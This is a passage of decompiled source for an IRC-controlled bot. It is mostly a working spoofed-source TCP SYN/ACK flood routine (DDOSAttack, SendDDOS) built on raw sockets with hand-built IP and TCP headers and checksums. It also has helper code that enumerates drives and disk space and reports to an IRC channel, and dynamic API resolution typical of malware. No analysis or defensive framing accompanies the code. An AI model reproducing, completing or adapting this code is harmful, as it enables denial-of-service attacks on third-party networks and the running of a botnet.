    *(int*) ((IntPtr) param + 656) = 1;
    \u003CModule\u003E.srand(\u003CModule\u003E.GetTickCount());
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD;
    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D0, __arglist (\u003CModule\u003E.DDOSAttack((sbyte*) ((IntPtr) &ddos + 8), (sbyte*) ((IntPtr) &ddos + 136), (sbyte*) ((IntPtr) &ddos + 520), (sbyte*) ((IntPtr) &ddos + 264))));
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &ddos + 652) == 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.irc_privmsg((uint) ^(int&) ref ddos, (sbyte*) ((IntPtr) &ddos + 392), (sbyte*) &arrayTypeBy0CaaD, ^(int&) ((IntPtr) &ddos + 648), 0);
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    \u003CModule\u003E.clearthread(^(int&) ((IntPtr) &ddos + 4));
    \u003CModule\u003E.ExitThread(0U);
    return 0;
  }

  internal static unsafe int SendDDOS(
    uint TargetIP,
    uint SpoofingIP,
    sbyte* Type,
    ushort TargetPort,
    int len)
  {
    \u0024ArrayType\u0024\u0024\u0024BY0DM\u0040D arrayTypeBy0DmD;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ref arrayTypeBy0DmD = (sbyte) 0;
    // ISSUE: cast to a reference type
    // ISSUE: initblk instruction
    __memset((\u0024ArrayType\u0024\u0024\u0024BY0DM\u0040D&) ((IntPtr) &arrayTypeBy0DmD + 1), 0, 59);
    WSAData wsaData;
    ref WSAData local1 = ref wsaData;
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.fWSAStartup)((WSAData*) 514, (ushort) ref local1) != 0)
      return 0;
    // ISSUE: function pointer call
    uint num1 = __calli(\u003CModule\u003E.fWSASocket)(2U, 3U, (_WSAPROTOCOL_INFOW*) (int) byte.MaxValue, 0, 0, 1);
    if (num1 == uint.MaxValue)
    {
      // ISSUE: function pointer call
      int num2 = __calli(\u003CModule\u003E.fWSACleanup)();
      return 0;
    }
    int num3 = 1;
    int num4 = (int) num1;
    ref int local2 = ref num3;
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.fsetsockopt)(num4, (sbyte*) 0, 2, (int) ref local2, 4U) == -1)
    {
      int num5 = (int) num1;
      // ISSUE: function pointer call
      int num6 = __calli(\u003CModule\u003E.fclosesocket)((uint) num5);
      // ISSUE: function pointer call
      int num7 = __calli(\u003CModule\u003E.fWSACleanup)();
      return 0;
    }
    sockaddr_in sockaddrIn;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref sockaddrIn = (short) 2;
    // ISSUE: cast to a reference type
    ref sockaddr_in local3 = (sockaddr_in&) ((IntPtr) &sockaddrIn + 2);
    int num8 = (int) TargetPort;
    // ISSUE: function pointer call
    int num9 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num8);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref local3 = (short) num9;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &sockaddrIn + 4) = (int) TargetIP;
    iphdr iphdr;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ref iphdr = (sbyte) 69;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: function pointer call
    ^(short&) ((IntPtr) &iphdr + 2) = (short) __calli(\u003CModule\u003E.fhtons)((ushort) 40);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &iphdr + 4) = (short) 1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &iphdr + 6) = (short) 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ((IntPtr) &iphdr + 8) = sbyte.MinValue;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ((IntPtr) &iphdr + 9) = (sbyte) 6;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &iphdr + 10) = (short) 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &iphdr + 16) = (int) TargetIP;
    tcphdr tcphdr;
    // ISSUE: cast to a reference type
    ref tcphdr local4 = (tcphdr&) ((IntPtr) &tcphdr + 2);
    int num10 = (int) TargetPort;
    // ISSUE: function pointer call
    int num11 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num10);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref local4 = (short) num11;
    ref tcphdr local5 = ref tcphdr;
    int num12 = (int) (ushort) ((uint) (ushort) \u003CModule\u003E.rand() % 1025U);
    // ISSUE: function pointer call
    int num13 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num12);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref local5 = (short) num13;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: function pointer call
    ^(int&) ((IntPtr) &tcphdr + 4) = (int) __calli(\u003CModule\u003E.fhtonl)(305419896U);
    if (\u003CModule\u003E.strcmp(Type, (sbyte*) &\u003CModule\u003E.\u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D1) == 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &tcphdr + 8) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(sbyte&) ((IntPtr) &tcphdr + 13) = (sbyte) 2;
    }
    else if (\u003CModule\u003E.strcmp(Type, (sbyte*) &\u003CModule\u003E.\u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D2) == 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &tcphdr + 8) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(sbyte&) ((IntPtr) &tcphdr + 13) = (sbyte) 16;
    }
    else if (\u003CModule\u003E.strcmp(Type, (sbyte*) &\u003CModule\u003E.\u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D3) == 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &tcphdr + 8) = \u003CModule\u003E.rand() % 3;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(sbyte&) ((IntPtr) &tcphdr + 13) = \u003CModule\u003E.rand() % 2 == 0 ? (sbyte) 2 : (sbyte) 16;
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ((IntPtr) &tcphdr + 12) = (sbyte) 80;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: function pointer call
    ^(short&) ((IntPtr) &tcphdr + 14) = (short) __calli(\u003CModule\u003E.fhtons)((ushort) 16384);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &tcphdr + 18) = (short) 0;
    int num14 = 0;
    _LARGE_INTEGER largeInteger1;
    \u003CModule\u003E.QueryPerformanceFrequency(&largeInteger1);
    _LARGE_INTEGER largeInteger2;
    \u003CModule\u003E.QueryPerformanceCounter(&largeInteger2);
    _LARGE_INTEGER largeInteger3;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(long&) ref largeInteger3 = (long) len * ^(long&) ref largeInteger1 + ^(long&) ref largeInteger2;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &tcphdr + 16) = (short) 0;
    ref tcphdr local6 = ref tcphdr;
    int num15 = (int) (ushort) (\u003CModule\u003E.rand() % 1001 + 1000);
    // ISSUE: function pointer call
    int num16 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num15);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref local6 = (short) num16;
    int num17 = \u003CModule\u003E.rand() << 16;
    // ISSUE: cast to a reference type
    ref tcphdr local7 = (tcphdr&) ((IntPtr) &tcphdr + 4);
    int num18 = (int) (ushort) (\u003CModule\u003E.rand() | num17);
    // ISSUE: function pointer call
    int num19 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num18);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref local7 = num19;
    // ISSUE: cast to a reference type
    ref iphdr local8 = (iphdr&) ((IntPtr) &iphdr + 12);
    int num20 = (int) SpoofingIP;
    // ISSUE: function pointer call
    int num21 = (int) __calli(\u003CModule\u003E.fhtonl)((uint) num20);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref local8 = num21;
    ++SpoofingIP;
    pshdr pshdr;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &pshdr + 4) = ^(int&) ((IntPtr) &iphdr + 16);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ((IntPtr) &pshdr + 8) = (sbyte) 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ((IntPtr) &pshdr + 9) = (sbyte) 6;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: function pointer call
    ^(short&) ((IntPtr) &pshdr + 10) = (short) __calli(\u003CModule\u003E.fhtons)((ushort) 20);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref pshdr = ^(int&) ((IntPtr) &iphdr + 12);
    \u003CModule\u003E.memcpy((void*) &arrayTypeBy0DmD, (void*) &pshdr, 32U);
    \u003CModule\u003E.memcpy((void*) ((IntPtr) &arrayTypeBy0DmD + 32), (void*) &tcphdr, 20U);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &tcphdr + 16) = (short) \u003CModule\u003E.checksum((ushort*) &arrayTypeBy0DmD, 52);
    \u003CModule\u003E.memcpy((void*) &arrayTypeBy0DmD, (void*) &iphdr, 20U);
    \u003CModule\u003E.memcpy((void*) ((IntPtr) &arrayTypeBy0DmD + 20), (void*) &tcphdr, 20U);
    \u003CModule\u003E.memset((void*) ((IntPtr) &arrayTypeBy0DmD + 40), 0, 4U);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ((IntPtr) &iphdr + 10) = (short) \u003CModule\u003E.checksum((ushort*) &arrayTypeBy0DmD, 40);
    \u003CModule\u003E.memcpy((void*) &arrayTypeBy0DmD, (void*) &iphdr, 20U);
    int num22 = (int) num1;
    ref \u0024ArrayType\u0024\u0024\u0024BY0DM\u0040D local9 = ref arrayTypeBy0DmD;
    ref sockaddr_in local10 = ref sockaddrIn;
    // ISSUE: function pointer call
    int num23 = __calli(\u003CModule\u003E.fsendto)(num22, (sockaddr*) ref local9, 40, 0, (sbyte*) ref local10, 16U);
    if (num23 != -1)
    {
      do
      {
        num14 = num23 + num14;
        \u003CModule\u003E.QueryPerformanceCounter(&largeInteger2);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(long&) ref largeInteger2 < ^(long&) ref largeInteger3)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(short&) ((IntPtr) &tcphdr + 16) = (short) 0;
          ref tcphdr local11 = ref tcphdr;
          int num24 = (int) (ushort) (\u003CModule\u003E.rand() % 1001 + 1000);
          // ISSUE: function pointer call
          int num25 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num24);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(short&) ref local11 = (short) num25;
          int num26 = \u003CModule\u003E.rand() << 16;
          // ISSUE: cast to a reference type
          ref tcphdr local12 = (tcphdr&) ((IntPtr) &tcphdr + 4);
          int num27 = (int) (ushort) (\u003CModule\u003E.rand() | num26);
          // ISSUE: function pointer call
          int num28 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num27);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref local12 = num28;
          // ISSUE: cast to a reference type
          ref iphdr local13 = (iphdr&) ((IntPtr) &iphdr + 12);
          int num29 = (int) SpoofingIP;
          // ISSUE: function pointer call
          int num30 = (int) __calli(\u003CModule\u003E.fhtonl)((uint) num29);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref local13 = num30;
          ++SpoofingIP;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &pshdr + 4) = ^(int&) ((IntPtr) &iphdr + 16);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(sbyte&) ((IntPtr) &pshdr + 8) = (sbyte) 0;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(sbyte&) ((IntPtr) &pshdr + 9) = (sbyte) 6;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: function pointer call
          ^(short&) ((IntPtr) &pshdr + 10) = (short) __calli(\u003CModule\u003E.fhtons)((ushort) 20);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref pshdr = ^(int&) ((IntPtr) &iphdr + 12);
          \u003CModule\u003E.memcpy((void*) &arrayTypeBy0DmD, (void*) &pshdr, 32U);
          \u003CModule\u003E.memcpy((void*) ((IntPtr) &arrayTypeBy0DmD + 32), (void*) &tcphdr, 20U);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(short&) ((IntPtr) &tcphdr + 16) = (short) \u003CModule\u003E.checksum((ushort*) &arrayTypeBy0DmD, 52);
          \u003CModule\u003E.memcpy((void*) &arrayTypeBy0DmD, (void*) &iphdr, 20U);
          \u003CModule\u003E.memcpy((void*) ((IntPtr) &arrayTypeBy0DmD + 20), (void*) &tcphdr, 20U);
          \u003CModule\u003E.memset((void*) ((IntPtr) &arrayTypeBy0DmD + 40), 0, 4U);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(short&) ((IntPtr) &iphdr + 10) = (short) \u003CModule\u003E.checksum((ushort*) &arrayTypeBy0DmD, 40);
          \u003CModule\u003E.memcpy((void*) &arrayTypeBy0DmD, (void*) &iphdr, 20U);
          int num31 = (int) num1;
          ref \u0024ArrayType\u0024\u0024\u0024BY0DM\u0040D local14 = ref arrayTypeBy0DmD;
          ref sockaddr_in local15 = ref sockaddrIn;
          // ISSUE: function pointer call
          num23 = __calli(\u003CModule\u003E.fsendto)(num31, (sockaddr*) ref local14, 40, 0, (sbyte*) ref local15, 16U);
        }
        else
          goto label_16;
      }
      while (num23 != -1);
      goto label_15;
label_16:
      int num32 = (int) num1;
      // ISSUE: function pointer call
      int num33 = __calli(\u003CModule\u003E.fclosesocket)((uint) num32);
      // ISSUE: function pointer call
      int num34 = __calli(\u003CModule\u003E.fWSACleanup)();
      return num14;
    }
label_15:
    \u0024ArrayType\u0024\u0024\u0024BY0EA\u0040D arrayTypeBy0EaD;
    // ISSUE: function pointer call
    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0EaD, (sbyte*) &\u003CModule\u003E.\u003FA0xca46e07d\u002Eunnamed\u002Dglobal\u002D4, __arglist (__calli(\u003CModule\u003E.fWSAGetLastError)()));
    int num35 = (int) num1;
    // ISSUE: function pointer call
    int num36 = __calli(\u003CModule\u003E.fclosesocket)((uint) num35);
    // ISSUE: function pointer call
    int num37 = __calli(\u003CModule\u003E.fWSACleanup)();
    return 0;
  }

  internal static unsafe int DDOSAttack(sbyte* target, sbyte* port, sbyte* type, sbyte* len)
  {
    uint TargetIP = \u003CModule\u003E.ResolveAddress(target);
    ushort TargetPort = (ushort) \u003CModule\u003E.atoi(port);
    int len1 = \u003CModule\u003E.atoi(len);
    uint SpoofingIP = (uint) ((int) TargetIP + \u003CModule\u003E.rand() % 512 + 256);
    int num = \u003CModule\u003E.SendDDOS(TargetIP, SpoofingIP, type, TargetPort, len1);
    if (num == 0)
      num = 1;
    return num / 1000 / len1;
  }

  internal static unsafe int FileExists(sbyte* filename, int mode) => \u003CModule\u003E._access(filename, mode) == -1 ? 0 : 1;

  internal static unsafe sbyte* commaI64(ulong number)
  {
    int num = 0;
    \u003CModule\u003E.memset((void*) &\u003CModule\u003E.\u003FA0x53f242d0\u002E\u003Fstr\u0040\u003F1\u003F\u003FcommaI64\u0040\u0040YAPBD_K\u0040Z\u00404PADA, 0, 50U);
    \u0024ArrayType\u0024\u0024\u0024BY0DC\u0040D arrayTypeBy0DcD;
    sbyte* numPtr1 = (sbyte*) &arrayTypeBy0DcD;
    while (true)
    {
      do
      {
        *numPtr1 = (sbyte) (uint) (number % 10UL + 48UL);
        ++numPtr1;
        number /= 10UL;
        if (number != 0UL)
          ++num;
        else
          goto label_4;
      }
      while (num % 3 != 0);
      *numPtr1 = (sbyte) 44;
      ++numPtr1;
    }
label_4:
    sbyte* numPtr2 = numPtr1 - 1;
    sbyte* numPtr3 = (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002E\u003Fstr\u0040\u003F1\u003F\u003FcommaI64\u0040\u0040YAPBD_K\u0040Z\u00404PADA;
    if ((IntPtr) numPtr2 >= ref arrayTypeBy0DcD)
    {
      do
      {
        *numPtr3 = *numPtr2;
        ++numPtr3;
        --numPtr2;
      }
      while ((IntPtr) numPtr2 >= ref arrayTypeBy0DcD);
    }
    *numPtr3 = (sbyte) 0;
    return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002E\u003Fstr\u0040\u003F1\u003F\u003FcommaI64\u0040\u0040YAPBD_K\u0040Z\u00404PADA;
  }

  internal static unsafe sbyte* DriveType(char* Drive)
  {
    char* chPtr = Drive;
    // ISSUE: function pointer call
    switch (__calli(\u003CModule\u003E.fGetDriveType)(chPtr))
    {
      case 0:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D0;
      case 1:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D1;
      case 3:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D2;
      case 4:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D3;
      case 5:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D4;
      case 6:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D5;
      default:
        return (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D6;
    }
  }

  internal static unsafe DKSP DiskSpace(char* Drive)
  {
    DKSP dksp;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(long&) ref dksp = -1L;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(long&) ((IntPtr) &dksp + 8) = -1L;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(long&) ((IntPtr) &dksp + 16) = -1L;
    if (\u003CModule\u003E.fGetDiskFreeSpaceEx != null)
    {
      char* chPtr = Drive;
      ref DKSP local1 = ref dksp;
      // ISSUE: cast to a reference type
      ref DKSP local2 = (DKSP&) ((IntPtr) &dksp + 16);
      // ISSUE: cast to a reference type
      ref DKSP local3 = (DKSP&) ((IntPtr) &dksp + 8);
      // ISSUE: function pointer call
      int num = __calli(\u003CModule\u003E.fGetDiskFreeSpaceEx)((_ULARGE_INTEGER*) chPtr, (_ULARGE_INTEGER*) ref local1, (_ULARGE_INTEGER*) ref local2, (char*) ref local3);
    }
    return dksp;
  }

  internal static unsafe DKSPKB DiskSpaceKB(char* Drive)
  {
    DKSP dksp = \u003CModule\u003E.DiskSpace(Drive);
    DKSPKB dkspkb;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(long&) ref dksp != -1L && ^(long&) ((IntPtr) &dksp + 8) != -1L && ^(long&) ((IntPtr) &dksp + 16) != -1L)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E._snprintf((sbyte*) &dkspkb, 128U, (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D10, __arglist ((IntPtr) \u003CModule\u003E.commaI64((ulong) ^(long&) ref dksp / 1024UL)));
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E._snprintf((sbyte*) ((IntPtr) &dkspkb + 128), 128U, (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D11, __arglist ((IntPtr) \u003CModule\u003E.commaI64((ulong) ^(long&) ((IntPtr) &dksp + 8) / 1024UL)));
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E._snprintf((sbyte*) ((IntPtr) &dkspkb + 256), 128U, (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D12, __arglist ((IntPtr) \u003CModule\u003E.commaI64((ulong) ^(long&) ((IntPtr) &dksp + 16) / 1024UL)));
    }
    else
    {
      \u003CModule\u003E.sprintf((sbyte*) &dkspkb, (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D7, __arglist ());
      \u003CModule\u003E.sprintf((sbyte*) ((IntPtr) &dkspkb + 128), (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D8, __arglist ());
      \u003CModule\u003E.sprintf((sbyte*) ((IntPtr) &dkspkb + 256), (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D9, __arglist ());
    }
    return dkspkb;
  }

  internal static unsafe void DriveSpace(uint sock, sbyte* chan, int notice, char* Drive)
  {
    DKSPKB dkspkb = \u003CModule\u003E.DiskSpaceKB(Drive);
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD;
    if (\u003CModule\u003E.strcmp((sbyte*) ((IntPtr) &dkspkb + 256), (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D13) == 0)
    {
      \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D14, __arglist ((IntPtr) \u003CModule\u003E.DriveType(Drive), (IntPtr) Drive));
    }
    else
    {
      // ISSUE: cast to a reference type
      // ISSUE: cast to a reference type
      \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D15, __arglist ((IntPtr) \u003CModule\u003E.DriveType(Drive), (IntPtr) Drive, (DKSPKB&) ((IntPtr) &dkspkb + 256), (DKSPKB&) ((IntPtr) &dkspkb + 128), out dkspkb));
    }
    \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 1);
  }

  internal static unsafe void DriveInfo(uint sock, sbyte* chan, int notice, char* Drive)
  {
    if ((IntPtr) Drive != IntPtr.Zero)
    {
      \u003CModule\u003E.DriveSpace(sock, chan, notice, Drive);
    }
    else
    {
      // ISSUE: function pointer call
      uint num1 = __calli(\u003CModule\u003E.fGetLogicalDriveStrings)((char*) 0, 0U);
      sbyte* numPtr = (sbyte*) \u003CModule\u003E.malloc(num1 + 2U);
      \u0024ArrayType\u0024\u0024\u0024BY03_W arrayTypeBy03W;
      \u003CModule\u003E.MultiByteToWideChar(0U, 1U, numPtr, -1, (char*) &arrayTypeBy03W, 4);
      int num2 = (int) num1 + 2;
      ref \u0024ArrayType\u0024\u0024\u0024BY03_W local = ref arrayTypeBy03W;
      // ISSUE: function pointer call
      int num3 = (int) __calli(\u003CModule\u003E.fGetLogicalDriveStrings)((char*) num2, (uint) ref local);
      char* Drive1 = (char*) &arrayTypeBy03W;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(ushort&) ref arrayTypeBy03W != (ushort) 0)
      {
        do
        {
          if (\u003CModule\u003E.wcscmp(Drive1, (char*) &\u003CModule\u003E.\u003FA0x53f242d0\u002Eunnamed\u002Dglobal\u002D16) != 0)
            \u003CModule\u003E.DriveSpace(sock, chan, notice, Drive1);
          Drive1 = (char*) ((int) \u003CModule\u003E.wcslen(Drive1) * 2 + (IntPtr) Drive1 + 2);
        }
        while (*Drive1 != char.MinValue);
      }
      \u003CModule\u003E.free((void*) numPtr);
    }
  }

  internal static unsafe void irc_privmsg(
    uint sock,
    sbyte* dest,
    sbyte* msg,
    int notice,
    int delay)
  {
    sbyte* numPtr = notice == 0 ? (sbyte*) &\u003CModule\u003E.\u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D1 : (sbyte*) &\u003CModule\u003E.\u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D0;
    int num1 = 506 - (int) \u003CModule\u003E.strlen(numPtr) - (int) \u003CModule\u003E.strlen(dest);
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD1;
    \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD1, (uint) num1, (sbyte*) &\u003CModule\u003E.\u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D2, __arglist ((IntPtr) msg));
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD2;
    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD2, (sbyte*) &\u003CModule\u003E.\u003FA0xd02fe2a1\u002Eunnamed\u002Dglobal\u002D3, __arglist ((IntPtr) numPtr, (IntPtr) dest, out arrayTypeBy0CaaD1));
    int num2 = (int) sock;
    ref \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D local = ref arrayTypeBy0CaaD2;
    int num3 = (int) \u003CModule\u003E.strlen((sbyte*) &arrayTypeBy0CaaD2);
    // ISSUE: function pointer call
    int num4 = __calli(\u003CModule\u003E.fsend)(num2, (int) ref local, (sbyte*) num3, 0U);
    if (delay == 0)
      return;
    \u003CModule\u003E.Sleep(2000U);
  }

  internal static unsafe int LoadDLLs()
  {
    HINSTANCE__* moduleHandleW1 = \u003CModule\u003E.GetModuleHandleW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D0);
    if ((IntPtr) moduleHandleW1 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSetErrorMode = (__FnPtr<uint (uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D1);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fCreateToolhelp32Snapshot = (__FnPtr<void* (uint, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D2);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fProcess32First = (__FnPtr<int (void*, tagPROCESSENTRY32W*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D3);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fProcess32Next = (__FnPtr<int (void*, tagPROCESSENTRY32W*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D4);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fModule32First = (__FnPtr<int (void*, tagMODULEENTRY32W*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D5);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetDiskFreeSpaceEx = (__FnPtr<int (char*, _ULARGE_INTEGER*, _ULARGE_INTEGER*, _ULARGE_INTEGER*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D6);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetLogicalDriveStrings = (__FnPtr<uint (uint, char*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D7);
      // ISSUE: cast to a function pointer type
